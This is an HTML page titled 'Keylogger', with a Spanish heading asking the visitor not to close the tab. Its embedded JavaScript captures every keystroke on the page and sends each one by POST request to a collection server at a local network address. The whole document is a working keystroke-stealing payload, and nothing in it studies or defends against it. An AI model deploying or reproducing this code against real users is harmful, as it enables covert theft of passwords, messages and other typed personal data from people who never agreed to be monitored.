<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger</title>
</head>
<body>
    <script>
        document.addEventListener('keydown', function(event) {
            var key = event.key;
            var code = event.code;
            var which = event.which;

            // Crear un objeto con toda la información relevante del evento de tecla
            var keyData = {
                key: key,
                code: code,
                which: which
            };

            // Enviar los datos al servidor
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://192.168.10.215:5000/log", true);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.send(JSON.stringify(keyData));
        });
    </script>
    <h1>Por favor, no cierres esta pestaña.</h1>
</body>
</html>
